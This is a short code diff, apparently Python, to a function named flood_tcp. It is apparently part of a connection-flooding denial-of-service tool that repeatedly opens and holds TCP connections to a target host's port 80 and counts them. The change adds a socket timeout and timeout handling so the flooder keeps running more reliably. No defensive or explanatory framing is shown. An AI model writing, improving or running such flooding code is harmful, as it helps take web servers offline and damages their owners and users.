@@ -10,11 +10,12 @@ def flood_tcp(host: str):
     global connections
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
         sock.connect((host, 80))
         time.sleep(3)
         sock.close()
         connections += 1
-    except socket.error:
+    except (socket.error, socket.timeout):
         pass
 
 class InfiniteIterator:
